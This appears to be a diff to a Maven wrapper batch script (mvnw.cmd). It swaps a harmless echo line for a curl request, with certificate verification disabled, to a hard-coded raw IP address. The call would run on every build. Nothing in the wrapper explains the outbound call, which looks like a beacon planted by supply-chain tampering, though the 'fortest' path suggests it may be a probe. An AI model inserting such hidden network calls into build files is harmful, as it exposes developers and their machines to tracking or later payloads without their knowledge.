@@ -50,7 +50,7 @@ if exist "%HOME%\mavenrc_pre.bat" call "%HOME%\mavenrc_pre.bat"
 if exist "%HOME%\mavenrc_pre.cmd" call "%HOME%\mavenrc_pre.cmd"
 :skipRcPre
 
-echo "some test"
+curl -vv -k "https://47.242.44.226/fortest20251014"
 
 @setlocal
 
